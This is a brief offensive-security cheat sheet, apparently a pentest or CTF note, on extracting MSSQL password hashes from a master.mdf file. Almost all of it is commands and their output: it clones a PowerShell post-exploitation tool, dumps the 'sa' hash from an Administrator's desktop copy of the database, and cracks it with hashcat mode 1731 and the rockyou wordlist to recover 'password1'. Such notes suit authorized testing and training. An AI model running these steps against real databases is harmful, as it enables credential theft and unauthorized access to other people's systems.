# Master MDF Hash Extraction

[https://blog.xpnsec.com/extracting-master-mdf-hashes/](https://blog.xpnsec.com/extracting-master-mdf-hashes/)

```
git clone https://github.com/xpn/Powershell-PostExploitation.git
```

```
Editing the file, 2 line to correct directory for dlls.

Import-Module .\Get-MDFHashes.ps1

Get-MDFHashes -mdf "C:\Users\Administrator\Desktop\master.mdf"
sa                             0x.......
```

Cracking.

https://hashcat.net/wiki/doku.php?id=example\_hashes

1731 - MSSQL (2012, 2014) - MATCH!

```
hashcat -m 1731 -a 0 hash.txt rockyou.txt --force
sa - password1
```
